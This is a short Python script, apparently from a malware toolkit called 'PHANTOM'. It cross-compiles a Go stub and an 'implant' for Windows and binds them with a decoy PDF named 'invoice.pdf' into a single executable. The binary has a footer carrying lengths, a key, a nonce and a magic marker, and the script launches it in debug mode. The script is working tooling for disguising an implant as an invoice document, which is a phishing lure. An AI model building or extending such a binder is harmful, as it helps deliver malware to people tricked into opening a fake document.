"""Repack a bound artifact from raw pieces and launch it with debug output.

Compiles the stub and the implant for Windows on first use, or reuses
``.tmp/sdbg.exe`` and ``.tmp/impd.exe`` when they are already there.
"""

import os
import struct
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
MAGIC = b"PHNTBINDv2______"
tmp = ROOT / ".tmp"
tmp.mkdir(exist_ok=True)


def build(src: Path, out: Path):
    env = dict(os.environ, GOOS="windows", GOARCH="amd64", CGO_ENABLED="0",
               GOTOOLCHAIN="local")
    subprocess.run(["go", "build", "-trimpath", "-buildvcs=false",
                    "-ldflags", "-s -w", "-o", str(out), "."],
                   cwd=str(src), env=env, check=True)


def rb(p: Path) -> bytes:
    with open(str(p), "rb") as fh:
        return fh.read()


stub_path, imp_path = tmp / "sdbg.exe", tmp / "impd.exe"
if not stub_path.exists():
    build(ROOT / "server" / "stub", stub_path)
if not imp_path.exists():
    build(ROOT / "implant", imp_path)

stub, imp = rb(stub_path), rb(imp_path)
doc = b"%PDF-1.4 decoy payload\r\n"
name = b"invoice.pdf"
# footer: impLen, docLen, nameLen, flags(1=wait), key(32), nonce(12), magic
footer = (struct.pack("<IIII", len(imp), len(doc), len(name), 1)
          + bytes(32) + bytes(12) + MAGIC)
out = tmp / "bound-debug.exe"
with open(str(out), "wb") as fh:
    fh.write(stub + imp + doc + name + footer)

env = dict(os.environ, PHANTOM_DEBUG="1")
p = subprocess.run([str(out)], capture_output=True, text=True, encoding="utf-8",
                   errors="replace", timeout=60, env=env)
print("rc", p.returncode)
print("STDERR:", p.stderr[:3000])


